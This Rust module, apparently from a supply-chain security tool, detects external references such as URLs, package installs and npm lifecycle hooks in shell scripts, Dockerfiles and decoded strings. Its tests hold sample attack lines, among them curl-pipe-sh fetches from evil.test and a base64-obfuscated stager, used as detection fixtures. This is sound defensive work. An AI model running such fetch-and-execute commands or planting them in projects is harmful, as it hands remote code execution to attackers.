//! Recognize external references in a parsed file — the "needle in the
//! haystack" half of fletch.
//!
//! filefacts already yields *declared* dependencies (manifest/lockfile fields)
//! on [`ParsedFile::references`]. This module returns those **plus** the
//! *undeclared / imperative* ones hunted out of command streams and decoded
//! text: a `curl … | sh`, an `npm install` in a `Dockerfile RUN`, a URL stashed
//! in a shell variable. The result is one unified list of [`ExternalRef`]s; the
//! caller hands it to [`crate::fetch`].
//!
//! Recognition is fuzzy by nature, so it lives here — away from filefacts'
//! deterministic format parsers and from the auditable fetch boundary.

use filefacts::{ExternalRef, FileType, ParsedFile, RefKind, RefLocator};

/// All external references a file points at: filefacts' declared dependencies,
/// plus the imperative ones recognized here.
#[must_use]
pub fn references(parsed: &ParsedFile<'_>) -> Vec<ExternalRef> {
    let mut found = Found {
        refs: parsed.references().to_vec(),
        text: std::str::from_utf8(parsed.bytes()).ok(),
    };
    // Value-driven recognition (npm lifecycle hooks) works from facts alone, so
    // it runs for every file — it no-ops when there is no `npm.scripts` branch.
    npm_scripts(parsed.values().as_json(), &mut found);
    // String-driven recognition: URLs that stng surfaced from the extracted
    // strings — crucially including ones it recovered from *encoding* (a base64-
    // or url-encoded URL the raw bytes never show in the clear).
    extracted_refs(parsed, &mut found);
    // Text-driven recognition needs the raw bytes.
    match parsed.fileid().file_type() {
        FileType::Shell => scan_shell(found.text, "shell", &mut found),
        FileType::Dockerfile => scan_shell(found.text, "dockerfile", &mut found),
        _ => {}
    }
    dedup(&mut found.refs);
    found.refs
}

/// References discoverable from a file's *facts* alone — its declared
/// references plus the value-driven recognizers (npm lifecycle hooks) — without
/// the raw bytes. This is what a consumer can run on an archive **member**,
/// whose bytes a prior analysis extracted and discarded but whose filefacts
/// values it retained. `values` is `filefacts::Values::as_json()`. The
/// text-driven recognizers (shell/Dockerfile command streams) are *not* covered
/// here — they need the bytes; use [`references`] when those are in hand.
#[must_use]
pub fn references_from_facts(
    values: &serde_json::Value,
    declared: &[ExternalRef],
) -> Vec<ExternalRef> {
    let mut found = Found {
        refs: declared.to_vec(),
        text: None,
    };
    npm_scripts(values, &mut found);
    dedup(&mut found.refs);
    found.refs
}

/// URLs recovered from the file's extracted strings — including ones stng
/// decoded out of base64 / url-encoding / hex, which the raw byte hunt can never
/// see. The decoded value carries the URL; the original encoded form (`raw`) is
/// the evidence, so the citation points at the bytes that actually appear.
fn extracted_refs(parsed: &ParsedFile<'_>, out: &mut Found<'_>) {
    for s in parsed.text().iter() {
        for url in extract_urls(&s.value) {
            let evidence = s.raw.clone().unwrap_or_else(|| s.value.clone());
            out.push(
                RefLocator::Url(url.to_string()),
                RefKind::UrlFetch,
                "string",
                evidence,
            );
        }
    }
}

/// Drop references whose locator already appeared, keeping the first. The same
/// URL or package legitimately surfaces through more than one recognizer
/// (declared, npm hook, decoded string, command stream).
fn dedup(refs: &mut Vec<ExternalRef>) {
    let mut seen = std::collections::HashSet::new();
    refs.retain(|r| {
        seen.insert(match &r.locator {
            RefLocator::Purl(p) => p.clone(),
            RefLocator::Url(u) => u.clone(),
        })
    });
}

/// Discover references in raw bytes: open them with filefacts and run
/// [`references`]. For callers that hold bytes rather than a parsed file (e.g.
/// a root sample on disk). Returns an empty list when filefacts can't parse the
/// input — discovery is best-effort, never an error.
#[must_use]
pub fn references_in_bytes(data: &[u8], filename: &str) -> Vec<ExternalRef> {
    match filefacts::open_with_path(std::path::Path::new(filename), data) {
        Ok(parsed) => references(&parsed),
        Err(_) => Vec::new(),
    }
}

/// Accumulator that carries the file text so each pushed reference gets a
/// citable byte offset.
struct Found<'a> {
    refs: Vec<ExternalRef>,
    text: Option<&'a str>,
}

impl Found<'_> {
    /// Push an imperative reference (no pin), deriving its offset from the first
    /// occurrence of `evidence`, else the package-name/URL, else `0`.
    fn push(
        &mut self,
        locator: RefLocator,
        kind: RefKind,
        source: impl Into<String>,
        evidence: impl Into<String>,
    ) {
        let evidence = evidence.into();
        let offset = self
            .text
            .and_then(|t| {
                t.find(&evidence)
                    .or_else(|| t.find(&anchor_from_locator(&locator)))
            })
            .unwrap_or(0) as u64;
        self.refs.push(ExternalRef {
            locator,
            kind,
            source: source.into(),
            evidence,
            offset,
            pinned_hash: None,
            content_sha256: None,
        });
    }
}

/// npm lifecycle hooks: a `postinstall` that `wget … | sh` or `npm install`s a
/// package. The command string is the reference site. Reads the hooks from the
/// nested filefacts values JSON (`npm.scripts.{hook}`), so it works equally on a
/// live `ParsedFile` and on the retained facts of an archive member.
fn npm_scripts(values: &serde_json::Value, out: &mut Found<'_>) {
    let scripts = values.get("npm").and_then(|n| n.get("scripts"));
    let Some(scripts) = scripts else {
        return;
    };
    for hook in ["preinstall", "install", "postinstall"] {
        let Some(cmd) = scripts.get(hook).and_then(|v| v.as_str()) else {
            continue;
        };
        let source = format!("npm.scripts.{hook}");
        for url in extract_urls(cmd) {
            out.push(
                RefLocator::Url(url.to_string()),
                RefKind::UrlFetch,
                source.clone(),
                cmd,
            );
        }
        commands(cmd, &source, out);
    }
}

/// Scan a shell script / Dockerfile body for package-manager commands and URLs.
fn scan_shell(text: Option<&str>, source: &str, out: &mut Found<'_>) {
    let Some(text) = text else {
        return;
    };
    commands(text, source, out);
    urls(text, source, out);
}

/// Recognize package-manager install commands and emit a [`RefKind::Command`]
/// per named package. Splits on command separators, joins `\` line
/// continuations, and matches the invocation anywhere in a segment.
fn commands(scan: &str, source: &str, out: &mut Found<'_>) {
    let joined = scan.replace("\\\r\n", " ").replace("\\\n", " ");
    for seg in joined.split([';', '&', '|', '\n', '\r']) {
        let seg = seg.trim();
        if seg.is_empty() {
            continue;
        }
        let toks: Vec<&str> = seg.split_whitespace().collect();
        for i in 0..toks.len() {
            let Some((eco, consumed)) = match_pm(&toks[i..]) else {
                continue;
            };
            for arg in &toks[i + consumed..] {
                if arg.starts_with('>') || arg.starts_with('<') {
                    break; // a redirect ends the package list
                }
                if let Some(locator) = pm_token_locator(eco, arg) {
                    out.push(locator, RefKind::Command, source, seg);
                }
            }
            break; // the rest of the segment is this command's arguments
        }
    }
}

/// Scan text line-by-line for `http`/`https` URLs (curl/wget targets, a URL in
/// a variable) and emit a [`RefKind::UrlFetch`] per URL.
fn urls(text: &str, source: &str, out: &mut Found<'_>) {
    for line in text.lines() {
        for url in extract_urls(line) {
            out.push(
                RefLocator::Url(url.to_string()),
                RefKind::UrlFetch,
                source,
                line.trim(),
            );
        }
    }
}

/// Recognize a package-manager invocation at the start of a token slice,
/// returning its ecosystem and how many tokens the invocation spans
/// (`npm install` → 2, `uv pip install` → 3).
fn match_pm(toks: &[&str]) -> Option<(&'static str, usize)> {
    match *toks.first()? {
        "npm" | "pnpm" | "yarn" | "bun" => {
            matches!(*toks.get(1)?, "install" | "i" | "add" | "a").then_some(("npm", 2))
        }
        "pip" | "pip3" | "pipx" => (*toks.get(1)? == "install").then_some(("pypi", 2)),
        "uv" => match *toks.get(1)? {
            "pip" if toks.get(2) == Some(&"install") => Some(("pypi", 3)),
            "add" => Some(("pypi", 2)),
            _ => None,
        },
        // `go get`/`go install <module>@<version>` and `cargo install <crate>`
        // resolve to fetchable artifacts; gem/composer/apt are recorded for now.
        "go" => matches!(*toks.get(1)?, "get" | "install").then_some(("golang", 2)),
        "cargo" => (*toks.get(1)? == "install").then_some(("cargo", 2)),
        "gem" => (*toks.get(1)? == "install").then_some(("gem", 2)),
        "composer" => (*toks.get(1)? == "require").then_some(("composer", 2)),
        "apt-get" | "apt" | "aptitude" => (*toks.get(1)? == "install").then_some(("deb", 2)),
        _ => None,
    }
}

/// A command argument as a package locator, or `None` if it is a flag, file,
/// path, or URL rather than a named package.
fn pm_token_locator(eco: &str, tok: &str) -> Option<RefLocator> {
    if !looks_like_package(eco, tok) {
        return None;
    }
    let purl = match eco {
        "npm" => npm_purl_token(tok)?,
        "pypi" => pypi_purl_token(tok)?,
        "golang" => version_purl_token("golang", tok, '@')?,
        "cargo" => version_purl_token("cargo", tok, '@')?,
        "deb" => version_purl_token("deb", tok, '=')?,
        "gem" => (!tok.is_empty()).then(|| format!("pkg:gem/{tok}"))?,
        "composer" => composer_purl_token(tok)?,
        _ => return None,
    };
    Some(RefLocator::Purl(purl))
}

/// Whether a command argument looks like a named package rather than a flag, a
/// URL, a path, or a file. Slashes are ecosystem-specific: npm allows one in a
/// `@scope/name`, Go/Composer names are `host/path` or `vendor/name`, the rest
/// reject `/` (it means a path).
fn looks_like_package(eco: &str, tok: &str) -> bool {
    let first = tok.chars().next().unwrap_or(' ');
    if !(first.is_ascii_alphanumeric() || first == '@') {
        return false; // flags, redirects, `./local`
    }
    if tok.contains("://") {
        return false; // a URL, not a named package
    }
    if tok.contains('/') {
        let slash_ok = match eco {
            "npm" => tok.starts_with('@') && tok.matches('/').count() == 1,
            "golang" | "composer" => true,
            _ => false,
        };
        if !slash_ok {
            return false;
        }
    }
    const FILE_EXT: &[&str] = &[
        ".txt", ".whl", ".toml", ".lock", ".cfg", ".tar", ".gz", ".zip", ".py", ".js",
    ];
    !FILE_EXT.iter().any(|e| tok.ends_with(e))
}

/// `pkg:<eco>/<name>[@<version>]` from a token whose version (if any) follows
/// `sep` (`@` for Go/cargo, `=` for apt). The name keeps its real case (Go
/// module paths are case-sensitive).
fn version_purl_token(eco: &str, tok: &str, sep: char) -> Option<String> {
    let (name, version) = tok
        .split_once(sep)
        .map_or((tok, None), |(n, v)| (n, Some(v)));
    if name.is_empty() {
        return None;
    }
    Some(match version {
        Some(v) if !v.is_empty() => format!("pkg:{eco}/{name}@{v}"),
        _ => format!("pkg:{eco}/{name}"),
    })
}

/// `pkg:composer/<vendor>/<name>` from a `composer require` token, dropping any
/// `:<constraint>` (a range, not a fetchable pin). Composer names are always
/// `vendor/name`.
fn composer_purl_token(tok: &str) -> Option<String> {
    let name = tok.split(':').next().unwrap_or(tok);
    (name.contains('/') && !name.is_empty()).then(|| format!("pkg:composer/{name}"))
}

/// `pkg:npm/...` from a command-line token (`foo`, `foo@1.2`, `@s/n`,
/// `@s/n@1.2`). `None` if the name is empty.
fn npm_purl_token(tok: &str) -> Option<String> {
    let (name, ver) = match tok.rfind('@') {
        Some(0) | None => (tok, None), // leading scope `@`, or no version
        Some(i) => (&tok[..i], Some(&tok[i + 1..])),
    };
    if name.is_empty() {
        return None;
    }
    let base = match name.strip_prefix('@').and_then(|s| s.split_once('/')) {
        Some((scope, pkg)) => format!("pkg:npm/%40{scope}/{pkg}"),
        None => format!("pkg:npm/{name}"),
    };
    Some(match ver {
        Some(v) if !v.is_empty() => format!("{base}@{v}"),
        _ => base,
    })
}

/// `pkg:pypi/...` from a command-line token, stripping extras (`pkg[x]`) and
/// version constraints (only an `==` pin becomes a PURL version).
fn pypi_purl_token(tok: &str) -> Option<String> {
    // Strip an `[extras]` span anywhere, keeping any trailing version.
    let base = match (tok.find('['), tok.find(']')) {
        (Some(o), Some(c)) if c > o => format!("{}{}", &tok[..o], &tok[c + 1..]),
        _ => tok.to_string(),
    };
    let name = base
        .split(['=', '>', '<', '~', '!', ';', ',', ' '])
        .next()
        .unwrap_or(&base)
        .trim();
    if name.is_empty() {
        return None;
    }
    let ver = base
        .split_once("==")
        .map(|(_, v)| v.split([',', ';', ' ']).next().unwrap_or(v))
        .filter(|v| !v.is_empty());
    Some(match ver {
        Some(v) => format!("pkg:pypi/{name}@{v}"),
        None => format!("pkg:pypi/{name}"),
    })
}

/// A findable substring for locating a reference when its full `evidence` isn't
/// verbatim in the file — the URL, or a PURL's package name (`%40`→`@`, version
/// stripped).
fn anchor_from_locator(loc: &RefLocator) -> String {
    match loc {
        RefLocator::Url(u) => u.clone(),
        RefLocator::Purl(p) => {
            let body = p.strip_prefix("pkg:").unwrap_or(p);
            let body = body.split_once('/').map_or(body, |(_, rest)| rest); // drop type
            let name = body.split('@').next().unwrap_or(body); // drop @version
            name.replace("%40", "@")
        }
    }
}

/// Yield each `http`/`https` URL embedded in a string. A URL runs until the
/// first character that cannot appear in one unquoted in a shell command.
fn extract_urls(cmd: &str) -> UrlScan<'_> {
    UrlScan { rest: cmd }
}

struct UrlScan<'a> {
    rest: &'a str,
}

impl<'a> Iterator for UrlScan<'a> {
    type Item = &'a str;

    fn next(&mut self) -> Option<&'a str> {
        loop {
            let start = self.rest.find("http")?;
            let cand = &self.rest[start..];
            let is_url = cand.starts_with("http://") || cand.starts_with("https://");
            if !is_url {
                self.rest = &cand[4..];
                continue;
            }
            let end = cand
                .find(|c: char| {
                    c.is_whitespace()
                        || matches!(
                            c,
                            '"' | '\'' | '|' | ';' | '`' | '<' | '>' | '(' | ')' | ','
                        )
                })
                .unwrap_or(cand.len());
            let url = &cand[..end];
            self.rest = &cand[end..];
            if url.len() > "https://".len() {
                return Some(url);
            }
        }
    }
}

#[cfg(test)]
#[allow(clippy::expect_used, clippy::unwrap_used, clippy::panic)]
mod tests {
    use super::*;

    #[test]
    fn shell_pkg_manager_commands_and_urls() {
        let script = "#!/bin/sh\n\
            URL1=\"https://web.stanford.edu/~pseay/pliant/et\"\n\
            sudo npm install evil-pkg\n\
            uv pip install requests==2.1 flask\n\
            curl -fsSL https://evil.test/stage2.sh | sh\n";
        let mut out = Found {
            refs: Vec::new(),
            text: Some(script),
        };
        scan_shell(out.text, "shell", &mut out);
        let purls: Vec<_> = out
            .refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Purl(p) => Some(p.as_str()),
                RefLocator::Url(_) => None,
            })
            .collect();
        assert!(purls.contains(&"pkg:npm/evil-pkg"));
        assert!(purls.contains(&"pkg:pypi/requests@2.1"));
        assert!(purls.contains(&"pkg:pypi/flask"));
        let url_refs: Vec<_> = out
            .refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Url(u) => Some(u.as_str()),
                RefLocator::Purl(_) => None,
            })
            .collect();
        assert!(url_refs.contains(&"https://web.stanford.edu/~pseay/pliant/et"));
        assert!(url_refs.contains(&"https://evil.test/stage2.sh"));
    }

    #[test]
    fn scoped_and_versioned_tokens() {
        assert_eq!(
            npm_purl_token("@acme/tool"),
            Some("pkg:npm/%40acme/tool".to_string())
        );
        assert_eq!(
            npm_purl_token("evil@2.0"),
            Some("pkg:npm/evil@2.0".to_string())
        );
        assert_eq!(
            pypi_purl_token("requests[security]==2.1"),
            Some("pkg:pypi/requests@2.1".to_string())
        );
    }

    #[test]
    fn references_from_facts_finds_npm_install_hooks() {
        // The nested values shape filefacts emits for a package.json, exactly as
        // it survives in an archive member's retained facts.
        let values = serde_json::json!({
            "npm": { "scripts": {
                "postinstall": "curl -fsSL https://evil.test/s.sh | sh",
                "preinstall": "npm install sketchy-pkg"
            }}
        });
        let refs = references_from_facts(&values, &[]);
        let urls: Vec<_> = refs
            .iter()
            .map(|r| match &r.locator {
                RefLocator::Url(u) => u.as_str(),
                RefLocator::Purl(p) => p.as_str(),
            })
            .collect();
        assert!(
            urls.contains(&"https://evil.test/s.sh"),
            "postinstall url: {refs:?}"
        );
        assert!(
            urls.contains(&"pkg:npm/sketchy-pkg"),
            "preinstall pkg: {refs:?}"
        );
        // No npm.scripts branch → declared refs pass through untouched.
        assert!(references_from_facts(&serde_json::json!({"npm":{"name":"x"}}), &[]).is_empty());
    }

    #[test]
    fn recognizes_go_cargo_gem_composer_apt_installs() {
        let script = "#!/bin/sh\n\
            go get github.com/evil/mod@v1.2.3\n\
            cargo install badcrate\n\
            gem install evilgem\n\
            composer require evil/pkg:^2.0\n\
            apt-get install -y sneakydeb nginx=1.18.0\n";
        let mut out = Found {
            refs: Vec::new(),
            text: Some(script),
        };
        scan_shell(out.text, "shell", &mut out);
        let purls: Vec<&str> = out
            .refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Purl(p) => Some(p.as_str()),
                RefLocator::Url(_) => None,
            })
            .collect();
        assert!(
            purls.contains(&"pkg:golang/github.com/evil/mod@v1.2.3"),
            "{purls:?}"
        );
        assert!(purls.contains(&"pkg:cargo/badcrate"), "{purls:?}");
        assert!(purls.contains(&"pkg:gem/evilgem"), "{purls:?}");
        assert!(purls.contains(&"pkg:composer/evil/pkg"), "{purls:?}");
        assert!(purls.contains(&"pkg:deb/sneakydeb"), "{purls:?}");
        assert!(purls.contains(&"pkg:deb/nginx@1.18.0"), "{purls:?}");
    }

    #[test]
    fn references_in_bytes_recovers_base64_encoded_url() {
        // A shell stager that base64-decodes a URL and curls it — the URL is
        // never in the clear, only as base64 (`https://evil.test/x.sh`). stng
        // decodes it during extraction; discovery must still surface it.
        let script =
            b"#!/bin/sh\nu=$(echo aHR0cHM6Ly9ldmlsLnRlc3QveC5zaA== | base64 -d)\ncurl -fsSL \"$u\" | sh\n";
        let refs = references_in_bytes(script, "stage.sh");
        let urls: Vec<_> = refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Url(u) => Some(u.as_str()),
                RefLocator::Purl(_) => None,
            })
            .collect();
        assert!(
            urls.contains(&"https://evil.test/x.sh"),
            "decoded base64 url should be recovered; got {refs:?}"
        );
    }

    #[test]
    fn references_in_bytes_finds_dockerfile_url() {
        let df = b"FROM alpine\nRUN curl -fsSL https://example.com/index.html | sh\n";
        let refs = references_in_bytes(df, "Dockerfile");
        let urls: Vec<_> = refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Url(u) => Some(u.as_str()),
                RefLocator::Purl(_) => None,
            })
            .collect();
        assert!(
            urls.contains(&"https://example.com/index.html"),
            "expected the RUN url; got {refs:?}"
        );
    }

    #[test]
    fn flags_files_and_urls_are_not_packages() {
        let mut out = Found {
            refs: Vec::new(),
            text: Some("pip install -r requirements.txt realpkg https://x.test/y.whl"),
        };
        commands(out.text.unwrap(), "shell", &mut out);
        let purls: Vec<_> = out
            .refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Purl(p) => Some(p.as_str()),
                RefLocator::Url(_) => None,
            })
            .collect();
        assert_eq!(purls, ["pkg:pypi/realpkg"]);
    }
}
